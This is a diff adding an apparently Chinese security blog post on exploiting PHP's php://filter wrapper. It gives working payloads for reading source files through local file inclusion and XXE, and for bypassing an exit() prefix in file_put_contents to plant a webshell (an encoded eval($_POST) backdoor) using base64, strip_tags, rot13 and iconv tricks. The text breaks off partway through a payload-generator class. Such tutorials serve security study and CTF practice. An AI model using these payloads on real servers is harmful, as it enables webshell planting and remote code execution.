@@ -1,0 +1,1566 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="make changes, make perfect">
+  <meta name="author" content="Dr34d">
+  <meta name="keywords" content="blog">
+  <title>php://filter利用手法 - Dr34d&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/xt256.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"greydr34d.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Dr34d's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Dr34d's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/LFI_RFI_banner.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="php://filter利用手法">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-28 15:04" pubdate>
+        2020年10月28日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      95
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">php://filter利用手法</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：9 天前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="php-filter利用手法"><a href="#php-filter利用手法" class="headerlink" title="php://filter利用手法"></a>php://filter利用手法</h1><p>常见payload</p>
+<p><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p><code>php://filter/write=convert.base64-decode/resource=shell.php</code></p>
+<div class="hljs code-wrapper"><pre><code class="hljs bash">resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。
+<span class="hljs-built_in">read</span>=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
+write=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
+&lt;；两个链的筛选列表&gt;        任何没有以 <span class="hljs-built_in">read</span>= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</code></pre></div>
+
+
+
+
+
+<h3 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">string.rot13  进行rot13转换
+string.toupper  将字符全部大写
+string.tolower  将字符全部小写
+string.strip_tags 去除空字符、HTML 和 PHP 标记后的结果。功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式。（自PHP 7.3.0起已弃用此功能。）</code></pre></div>
+
+
+
+<h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode
+<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-decode</code></pre></div>
+
+
+
+<h3 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs nsis"><span class="hljs-literal">zlib</span>.deflate 压缩
+<span class="hljs-literal">zlib</span>.inflate 解压
+<span class="hljs-literal">bzip2</span>.compress
+<span class="hljs-literal">bzip2</span>.decompress</code></pre></div>
+
+
+
+
+
+<h3 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h3><h2 id="0x01-XXE中的使用"><a href="#0x01-XXE中的使用" class="headerlink" title="0x01 XXE中的使用"></a>0x01 XXE中的使用</h2><p>在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p>
+<p>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/thum-693b1469385893.png" alt="QQ截图20160724235335.png"></p>
+<h2 id="0x02-file-put-contents-filename-”-lt-php-exit-”-content"><a href="#0x02-file-put-contents-filename-”-lt-php-exit-”-content" class="headerlink" title="0x02 file_put_contents($filename,”&lt;?php exit();”.$content);"></a>0x02 file_put_contents($filename,”&lt;?php exit();”.$content);</h2><h3 id="1-base64-decode绕过exit"><a href="#1-base64-decode绕过exit" class="headerlink" title="1. base64-decode绕过exit"></a>1. base64-decode绕过exit</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;
+<span class="hljs-variable">$content</span> .= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];
+file_put_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);</code></pre></div>
+
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
+<p>我们即可使用 php://filter协议来施展魔法：<strong>使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</strong></p>
+<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);
+base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);</code></pre></div>
+
+
+
+<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，<strong>字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</strong></p>
+<p><strong>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，</strong>而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
+<p>payload：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs bash">txt=aPD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=&amp;filename=php://filter/write=convert.base64-decode/resource=shell.php</code></pre></div>
+
+
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906091228807.png" alt="image-20200906091228807"></p>
+<h3 id="2-strip-tags-base64-decode组合利用"><a href="#2-strip-tags-base64-decode组合利用" class="headerlink" title="2. strip_tags+base64-decode组合利用"></a>2. strip_tags+base64-decode组合利用</h3><p>这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>
+<p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
+<p>编写如下测试代码即可查看 php://filter/read=string.strip_tags/resource=php://input 的效果：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs lisp">echo readfile(&#x27;php<span class="hljs-symbol">://filter/read=string</span>.strip_tags/resource=php<span class="hljs-symbol">://input</span>&#x27;)<span class="hljs-comment">;</span></code></pre></div>
+
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/content/uploadfile/201607/499a1469385895.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/thum-499a1469385895.png" alt="QQ截图20160725010403.png"></a></p>
+<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
+<p>万幸的是，<strong>php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode</strong>。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
+<p>payload</p>
+<div class="hljs code-wrapper"><pre><code class="hljs bash">txt=PD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</code></pre></div>
+
+
+
+<h3 id="3-rot13"><a href="#3-rot13" class="headerlink" title="3. rot13"></a>3. rot13</h3><p>除此之外，我们还可以**利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>**，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
+<p>payload</p>
+<div class="hljs code-wrapper"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.rot13/</span>resource=shell.php</code></pre></div>
+
+
+
+<p>这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag）</p>
+<h3 id="4-加入不存在的过滤器"><a href="#4-加入不存在的过滤器" class="headerlink" title="4. 加入不存在的过滤器"></a>4. 加入不存在的过滤器</h3><p>上面的场景中，考虑如下的payload：</p>
+<p><code>php://filter/write=string.strip_tags|sssss|convert.base64-decode/resource=shell.php</code></p>
+<p>其中ssss过滤器不存在，但是不妨碍我们写入shell，此处php只会报一个warning，并不会结束运行。</p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906103602914.png" alt="image-20200906103602914"></p>
+<h2 id="0x03-file-put-contents-a-”-lt-php-exit-”-a"><a href="#0x03-file-put-contents-a-”-lt-php-exit-”-a" class="headerlink" title="0x03 file_put_contents($a,”&lt;?php exit();”.$a);"></a>0x03 file_put_contents($a,”&lt;?php exit();”.$a);</h2><div class="hljs code-wrapper"><pre><code class="hljs php">file_put_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$a</span>);</code></pre></div>
+
+
+
+<h3 id="1-base64"><a href="#1-base64" class="headerlink" title="1. base64"></a>1. base64</h3><p><code>$a = php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=Cyc1e.php</code></p>
+<p><strong>php://filter面对不可用的规则是报个Warning，然后跳过继续执行的（不会退出）</strong>，所以按理说这样构造是<strong>“很完美”</strong>的，我们看下base-decode哪些字符👇</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php</span>//filter/write=convertbase<span class="hljs-number">64</span>decodePD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+/resource=Cyc<span class="hljs-number">1</span>e.php</code></pre></div>
+
+<p>而默认情况下base64编码是以 <code>=</code> 作为结尾的，所以<strong>正常解码的时候到了 <code>=</code> 就解码结束了</strong>，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的 <code>=</code> 过不掉，所以导致过滤器解码失败，<strong>从而报错（不过还是会创建文件的，内容由于解码过程出错了，就都丢弃了）</strong></p>
+<h3 id="2-rot13"><a href="#2-rot13" class="headerlink" title="2. rot13"></a>2. rot13</h3><p>rot13编码就不存在base64的问题，所以和前面base64构造的思路一样👇</p>
+<div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">$<span class="hljs-keyword">a</span> = php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13|<span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span>|/resource=Cyc1e.php</code></pre></div>
+
+<p><img src="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160545137.png" alt="img"></p>
+<p>和前面提到的一样，这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag（再补充一下，linux下默认是没有开启的））</p>
+<h3 id="3-iconv字符编码转换"><a href="#3-iconv字符编码转换" class="headerlink" title="3. iconv字符编码转换"></a>3. iconv字符编码转换</h3><p>这种方法由于之前没有见过，所以感觉这波操作比我的亚索还要秀~，想法是一样的，<strong>通过字符转换把<code>&lt;?php exit();</code>转成不能解析的，这里采用的是UCS-2或者UCS-4编码方式（当然还有很多，比如utf-8和utf-7），而我们构造的转成可正常解析的</strong></p>
+<p>官方文档中支持的</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>
+<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE
+<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE
+<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>
+<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE
+<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span>
+<span class="hljs-attribute">UTF7</span>-IMAP
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>
+<span class="hljs-attribute">ASCII</span>
+<span class="hljs-attribute">EUC</span>-JP
+<span class="hljs-attribute">SJIS</span>
+<span class="hljs-attribute">eucJP</span>-win
+<span class="hljs-attribute">SJIS</span>-win
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS
+<span class="hljs-attribute">CP932</span>
+<span class="hljs-attribute">CP51932</span>
+<span class="hljs-attribute">SJIS</span>-mac (alias: MacJapanese)
+<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO (alias: SJIS-DOCOMO)
+<span class="hljs-attribute">SJIS</span>-Mobile#KDDI (alias: SJIS-KDDI)
+<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO (alias: UTF-<span class="hljs-number">8</span>-DOCOMO)
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B (alias: UTF-<span class="hljs-number">8</span>-KDDI)
+<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK (alias: UTF-<span class="hljs-number">8</span>-SOFTBANK)
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI (alias: ISO-<span class="hljs-number">2022</span>-JP-KDDI)
+<span class="hljs-attribute">JIS</span>
+<span class="hljs-attribute">JIS</span>-ms
+<span class="hljs-attribute">CP50220</span>
+<span class="hljs-attribute">CP50220raw</span>
+<span class="hljs-attribute">CP50221</span>
+<span class="hljs-attribute">CP50222</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>
+<span class="hljs-attribute">byte2be</span>
+<span class="hljs-attribute">byte2le</span>
+<span class="hljs-attribute">byte4be</span>
+<span class="hljs-attribute">byte4le</span>
+<span class="hljs-attribute">BASE64</span>
+<span class="hljs-attribute">HTML</span>-ENTITIES (alias: HTML)
+<span class="hljs-attribute">7bit</span>
+<span class="hljs-attribute">8bit</span>
+<span class="hljs-attribute">EUC</span>-CN
+<span class="hljs-attribute">CP936</span>
+<span class="hljs-attribute">GB18030</span>
+<span class="hljs-attribute">HZ</span>
+<span class="hljs-attribute">EUC</span>-TW
+<span class="hljs-attribute">CP950</span>
+<span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>
+<span class="hljs-attribute">EUC</span>-KR
+<span class="hljs-attribute">UHC</span> (alias: CP<span class="hljs-number">949</span>)
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR
+<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span> (alias: CP<span class="hljs-number">1251</span>)
+<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span> (alias: CP<span class="hljs-number">1252</span>)
+<span class="hljs-attribute">CP866</span> (alias: IBM<span class="hljs-number">866</span>)
+<span class="hljs-attribute">KOI8</span>-R
+<span class="hljs-attribute">KOI8</span>-U
+<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span> (alias: ArmSCII<span class="hljs-number">8</span>)</code></pre></div>
+
+
+
+<p><strong>通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位一反转，也就是说构造的需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转</strong></p>
+<p>构造payload</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> iconv(<span class="hljs-string">&quot;UCS-4LE&quot;</span>,<span class="hljs-string">&quot;UCS-4BE&quot;</span>,<span class="hljs-string">&#x27;aa&lt;?php phpinfo();?&gt;&#x27;</span>);
+?&lt;aa phpiphp(ofn&gt;?;)</code></pre></div>
+
+
+
+
+
+<p>payload</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=Cyc1e.php&#x27;</span>;
+
+<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=Cyc1e.php&#x27;</span>;
+<span class="hljs-comment">#由于是4位一反转，所以需要保证?&lt;aa phpiphp(ofn&gt;?;)之前字符个数是4的倍数，所以需要补3个字符</span></code></pre></div>
+
+
+
+
+
+
+
+
+
+<h3 id="4-UCS-2组合rot13"><a href="#4-UCS-2组合rot13" class="headerlink" title="4. UCS-2组合rot13"></a>4. UCS-2组合rot13</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=drom.php&#x27;</span>; <span class="hljs-comment">#同样需要补位，这里补了一个x</span></code></pre></div>
+
+
+
+<p>基础poc：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generate</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&quot;&lt;?php exit();&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$base</span> = <span class="hljs-string">&quot;php://filter/write=&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span> = <span class="hljs-string">&quot;/resource=drom.php&quot;</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span> = [
+        <span class="hljs-string">&#x27;rot13&#x27;</span> =&gt; <span class="hljs-string">&#x27;str_rot13&#x27;</span>,
+        <span class="hljs-string">&#x27;toupper&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtoupper&#x27;</span>,
+        <span class="hljs-string">&#x27;tolower&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtolower&#x27;</span>,
+        <span class="hljs-string">&#x27;strip_tags&#x27;</span> =&gt; <span class="hljs-string">&#x27;strip_tags&#x27;</span>,
+    ];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zlib</span> = [
+        <span class="hljs-string">&#x27;deflate&#x27;</span>,
+        <span class="hljs-string">&#x27;inflate&#x27;</span>
+    ];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bzip2</span> = [
+        <span class="hljs-string">&#x27;compress&#x27;</span>,
+        <span class="hljs-string">&#x27;decompress&#x27;</span>
+    ];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$convert</span> = [
+        <span class="hljs-string">&#x27;UCS-4&#x27;</span>,
+        <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,
+        <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,
+        <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,
+        <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-32&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-16&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-7&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-8&#x27;</span>,
+        <span class="hljs-string">&#x27;ASCII&#x27;</span>,
+        <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS&#x27;</span>,
+        <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,
+        <span class="hljs-string">&#x27;CP932&#x27;</span>,
+        <span class="hljs-string">&#x27;CP51932&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,
+        <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,
+        <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,
+        <span class="hljs-string">&#x27;JIS&#x27;</span>,
